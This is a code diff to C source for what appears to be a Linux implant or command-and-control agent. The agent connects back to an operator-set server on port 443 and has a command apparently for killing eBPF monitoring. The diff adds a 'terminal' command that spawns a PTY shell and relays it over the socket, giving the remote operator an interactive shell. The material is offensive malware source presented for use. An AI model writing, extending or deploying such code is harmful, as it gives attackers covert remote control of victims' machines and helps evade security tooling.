@@ -13,12 +13,24 @@
 #include <signal.h>
 #include <errno.h>
 #include <ctype.h>
+#include <pty.h>
+#include <sys/wait.h>
+#include <stdint.h>
+#include <termios.h>
 
 #define SERVER_IP "127.0.0.1" //CHANGE THIS BRO
 #define SERVER_PORT 443 // RECOMMENDEED PORT 443
 #define QUEUE_DEPTH 16
 #define BUF_SIZE 65536
 #define RECONNECT_TIME 5
+
+//macro to shorten code
+#define SUBMIT_READ(ring, fd, buf) do { \
+    struct io_uring_sqe *s = io_uring_get_sqe(ring); \
+    io_uring_prep_read(s, fd, buf, 8192, 0); \
+    io_uring_sqe_set_data(s, buf); \
+    io_uring_submit(ring); \
+} while (0)
 
 int send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) {
     size_t sent = 0;
@@ -630,6 +642,119 @@ void cmd_killbpf(struct io_uring *ring, int sockfd) {
     send_all(ring, sockfd, out, out_pos);
 }
 
+typedef enum { TAG_SOCK, TAG_PTY } cqe_tag;
+
+#define SUBMIT_READ_TAGGED(ring, fd, buf, tag)                      \
+    do {                                                             \
+        struct io_uring_sqe *sqe = io_uring_get_sqe(ring);          \
+        io_uring_prep_read(sqe, (fd), (buf), sizeof(buf), 0);       \
+        io_uring_sqe_set_data(sqe, (tag));                          \
+        io_uring_submit(ring);                                       \
+    } while (0)
+
+void cmd_terminal(struct io_uring *ring, int sockfd) {
+    pid_t child;
+    int master_fd;
+    char buf_sock[8192];
+    char buf_pty[8192];
+
+    if ((child = forkpty(&master_fd, NULL, NULL, NULL)) < 0) {
+        write(sockfd, "pty spawn failed\n", 17);
+        exit(1);
+    }
+    if (!child) {
+        const char *sh = getenv("SHELL");
+        if (!sh) sh = "/bin/sh";
+        execlp(sh, sh, (char *)NULL);
+        _exit(127);
+    }
+
+    /* Disable PTY echo */
+    struct termios t;
+    tcgetattr(master_fd, &t);
+    t.c_lflag &= ~(ECHO | ECHOE | ECHOK | ECHONL);
+    tcsetattr(master_fd, TCSANOW, &t);
+
+    /* master_fd blocking, sockfd nonblocking */
+    fcntl(sockfd, F_SETFL, fcntl(sockfd, F_GETFL, 0) | O_NONBLOCK);
+
+    /* Use a pipe to signal the PTY thread to wake the io_uring loop */
+    int pipefd[2];
+    pipe(pipefd);
+    fcntl(pipefd[0], F_SETFL, fcntl(pipefd[0], F_GETFL, 0) | O_NONBLOCK);
+
+    /* Spawn a dedicated thread to block-read the PTY and forward to socket */
+    struct pty_fwd_args {
+        int master_fd;
+        int sockfd;
+        struct io_uring *ring;
+    };
+
+    /* Instead of threads, use a simple select()-based loop since
+     * we don't actually need io_uring for a single terminal session */
+    fd_set rfds;
+    int maxfd = (master_fd > sockfd ? master_fd : sockfd) + 1;
+
+    /* Drain initial prompt */
+    struct timeval tv = { .tv_sec = 0, .tv_usec = 50000 }; /* 50ms */
+    FD_ZERO(&rfds);
+    FD_SET(master_fd, &rfds);
+    if (select(master_fd + 1, &rfds, NULL, NULL, &tv) > 0) {
+        ssize_t n = read(master_fd, buf_pty, sizeof(buf_pty));
+        if (n > 0) send_all(ring, sockfd, buf_pty, (size_t)n);
+    }
+
+    while (1) {
+        FD_ZERO(&rfds);
+        FD_SET(sockfd, &rfds);
+        FD_SET(master_fd, &rfds);
+
+        if (select(maxfd, &rfds, NULL, NULL, NULL) < 0) {
+            if (errno == EINTR) continue;
+            break;
+        }
+
+        /* Data from client -> write to PTY */
+        if (FD_ISSET(sockfd, &rfds)) {
+            ssize_t n = recv(sockfd, buf_sock, sizeof(buf_sock), 0);
+            if (n <= 0) { shutdown(master_fd, SHUT_WR); break; }
+
+            for (ssize_t w = 0; w < n;) {
+                ssize_t r = write(master_fd, buf_sock + w, n - w);
+                if (r < 0) {
+                    if (errno == EINTR) continue;
+                    goto done;
+                }
+                w += r;
+            }
+
+            /* After writing command, wait for output before reading prompt */
+            usleep(10000); /* 10ms — give shell time to execute */
+
+            /* Drain all available PTY output for this command */
+            fcntl(master_fd, F_SETFL, fcntl(master_fd, F_GETFL, 0) | O_NONBLOCK);
+            ssize_t n2;
+            while ((n2 = read(master_fd, buf_pty, sizeof(buf_pty))) > 0) {
+                if (send_all(ring, sockfd, buf_pty, (size_t)n2) < 0) goto done;
+            }
+            fcntl(master_fd, F_SETFL, fcntl(master_fd, F_GETFL, 0) & ~O_NONBLOCK);
+        }
+
+        /* PTY output -> forward to client (prompt, async output, etc.) */
+        if (FD_ISSET(master_fd, &rfds)) {
+            ssize_t n = read(master_fd, buf_pty, sizeof(buf_pty));
+            if (n <= 0) { shutdown(sockfd, SHUT_WR); break; }
+            if (send_all(ring, sockfd, buf_pty, (size_t)n) < 0) break;
+        }
+    }
+
+done:
+    if (child > 0) { kill(child, SIGHUP); waitpid(child, NULL, 0); }
+    close(master_fd);
+    close(sockfd);
+    exit(0);
+}
+
 void process_cmd(struct io_uring *ring, int sockfd, char *cmd) {
     sanitize_cmd(cmd);
 
@@ -665,7 +790,10 @@ void process_cmd(struct io_uring *ring, int sockfd, char *cmd) {
     } else if (strncmp(cmd, "killbpf", 7) == 0) {
         cmd_killbpf(ring, sockfd);
 
-    } else if (strncmp(cmd, "exit", 4) == 0) {
+    } else if (!(strncmp(cmd, "terminal", 8))) {
+        cmd_terminal(ring, sockfd);
+
+    }else if (strncmp(cmd, "exit", 4) == 0) {
         cmd_exit(ring, sockfd);
 
     } else {
